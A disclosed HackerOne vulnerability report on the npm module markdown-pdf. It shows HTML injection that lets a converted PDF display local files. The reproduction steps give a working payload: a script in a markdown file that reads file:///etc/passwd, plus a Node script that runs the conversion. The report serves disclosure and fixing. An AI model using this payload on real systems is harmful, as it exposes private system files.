# [markdown-pdf] Local file reading

## Report Details
- **Report ID**: 360727
- **URL**: https://hackerone.com/reports/360727
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-06-01T09:15:21.413Z
- **Disclosed**: 2018-07-20T20:20:03.254Z

## Reporter
- **Username**: n1__
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report ```local file reading``` in ```markdown-pdf```
It allows to insert a malicious html code, which allows to read the local files.

# Module

**module name:** markdown-pdf
**version:** 8.1.1
**npm page:** `https://www.npmjs.com/package/markdown-pdf`

## Module Description

Node module that converts Markdown files to PDFs.

The PDF looks great because it is styled by HTML5 Boilerplate. What? - Yes! Your Markdown is first converted to HTML, then pushed into the HTML5 Boilerplate index.html. Phantomjs renders the page and saves it to a PDF. You can even customise the style of the PDF by passing an optional path to your CSS and you can pre-process your markdown file before it is converted to a PDF by passing in a pre-processing function, for templating.

## Module Stats

778 downloads in the last day
9,801 downloads in the last week

# Vulnerability

## Vulnerability Description

The markdown-pdf module allows you to convert markdown files to pdf. Due to insufficient filtration of the user input files, exist the possibility of inject a malicious html code. 

## Steps To Reproduce:

1. Make the file ``` test.md ``` with following content:

```
# this is h1
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

2. Make the file ``` test.js ``` with following content:

```javascript
var markdownpdf = require("markdown-pdf"), fs = require("fs")

fs.createReadStream("test.md")
  .pipe(markdownpdf())
  .pipe(fs.createWriteStream("document.pdf"))
```

3. Run the script: ``` node test.js ```
4. Open the file ```document.pdf ``` in the same directory


## Supporting Material/References:

* Operating system: Ubuntu 14.04
* Node.js 9.8.0
* npm 6.1.0

# Wrap up

* I contacted the maintainer to let him know: N
* I opened an issue in the related repository: N

# Recommendations fix:

Use html encode for encoding an user content, which not a markdown.

## Impact

After converting the file, user can read a local file of system.

## Attachments
No attachments
